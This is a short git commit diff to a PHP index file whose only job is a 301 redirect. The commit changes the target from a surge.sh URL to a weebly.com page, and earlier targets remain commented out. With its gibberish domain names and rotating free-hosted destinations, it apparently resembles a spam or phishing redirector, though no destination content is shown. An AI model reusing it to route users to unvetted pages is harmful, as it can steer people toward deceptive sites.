cc7ec61c7de7f8cb78e7be97d865553124751a6a
argeni5959 <67845811+argeni5959@users.noreply.github.com>
2020-09-06 15:27:12 -0400

    Update index.php

--- supermosterin/friaslesteriani/index.php
+++ supermosterin/friaslesteriani/index.php
@@ -6,7 +6,7 @@ Header( "HTTP/1.1 301 Moved Permanently" );
 
 
 //Header( "Location: https://sombrillamasterialespaww.blogspot.com/");
-Header( "Location: https://spookasy-quireaver.surge.sh/?limpor=materialasa");
+Header( "Location: https://elsproanlienaterialimasterial.weebly.com/");
 //Header( "Location: https://google.com");
 
 ?>
